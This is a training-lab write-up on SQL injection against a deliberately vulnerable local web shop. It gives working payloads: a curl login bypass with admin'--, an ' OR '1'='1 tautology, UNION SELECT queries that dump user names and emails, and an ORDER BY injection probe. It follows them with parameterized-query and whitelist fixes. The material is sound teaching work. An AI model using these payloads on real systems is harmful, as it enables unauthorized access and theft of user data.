# Lab 03: SQL injection — login, search, sort

Three spots concatenate user input into SQL. Login uses a tautology or a comment to bypass; search leaks the database with `UNION`; orders sort injects into `ORDER BY`.

**OWASP Top 10:2025:** [A05 Injection](https://owasp.org/Top10/2025/)

**Code:** `model/db.js` (`login`, `searchProducts`, `ordersForUserSorted`), `routes/auth.js`, `routes/shop.js` — see `VULN:` / `SAFE:` comments

## Exploit 1: login bypass

Log in as any user without a password:

```bash
curl -s -D - -o /dev/null -X POST http://localhost:8888/login/auth \
  --data-urlencode "username=admin'--" --data-urlencode "password=x" | grep -i location
# Location: /   ← admin session
```

Or the classic tautology: `username=' OR '1'='1` (logs you in as the first user).

## Exploit 2: UNION on search

`/search?q=` concatenates into `SELECT id, name, description, price_cents, image, stock, tags ...`. Seven columns; `tags` is `text[]`.

```text
http://localhost:8888/search?q=' UNION SELECT 1,version(),3,4,'e',6,'{v}'--
```

The Postgres version banner appears as a product. Dump users (username as name, email as description):

```text
http://localhost:8888/search?q=' UNION SELECT 1,username,email,0,'e',6,'{v}' FROM users--
```

## Exploit 3: ORDER BY injection

`/orders?sort=` is interpolated (ORDER BY cannot be a bound parameter):

```text
http://localhost:8888/orders?sort=nope
```

returns the SQL error — confirming injection. Boolean/error-based extraction works from here.

## Fix

```js
// login + search: parameters
pool.query("SELECT * FROM users WHERE username=$1 AND password=$2", [u, p]);
pool.query("SELECT * FROM products WHERE name ILIKE $1 OR description ILIKE $2",
  [`%${q}%`, `%${q}%`]);

// sort: whitelist — never interpolate
const SORTS = { date: "created_at", price: "amount_cents" };
const col = SORTS[req.query.sort] ?? "created_at";
```

## Verify

All three exploits return normal responses (401 / 0 results / default sort) after the fix.

Related: lab 09 shows the SQL error text rendered on the page.